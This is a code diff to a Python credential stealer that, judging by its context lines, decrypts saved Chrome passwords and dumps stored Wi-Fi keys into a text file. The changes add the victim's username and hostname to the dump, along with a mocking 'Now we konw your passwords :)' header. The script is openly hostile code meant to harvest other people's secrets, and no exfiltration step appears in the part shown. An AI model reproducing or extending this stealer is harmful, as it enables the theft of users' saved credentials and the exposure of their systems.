@@ -7,11 +7,22 @@ from Crypto.Cipher import AES
 import shutil
 from datetime import timezone, datetime, timedelta
 import subprocess
+import getpass
+import socket
 
 PWinFileAll = open("WifiPasswords.txt", "w")
 
+username = getpass.getuser()
+homedir = os.path.expanduser("~")
 PWinFileAll.write("####################################################################################################\n\n")
-PWinFileAll.write("Chrome\n\n")
+PWinFileAll.write("Now we konw your passwords :)\n\n")
+PWinFileAll.write("Systeminformations:\n")
+PWinFileAll.write("Username:\t"+getpass.getuser()+"\n")
+PWinFileAll.write("Username:\t"+socket.gethostname()+"\n\n")
+PWinFileAll.write("####################################################################################################\n\n\n\n\n")
+
+PWinFileAll.write("####################################################################################################\n\n")
+PWinFileAll.write("Chrome Passwords:\n\n")
 PWinFileAll.write("####################################################################################################\n\n\n")
 
 def get_chrome_datetime(chromedate):
@@ -104,7 +115,7 @@ if __name__ == "__main__":
 PWinFileAll.write("####################################################################################################\n\n")
 
 
-PWinFileAll.write("Wifi Password\n\n")
+PWinFileAll.write("Wifi Passwords:\n\n")
 PWinFileAll.write("####################################################################################################\n\n")
 
 
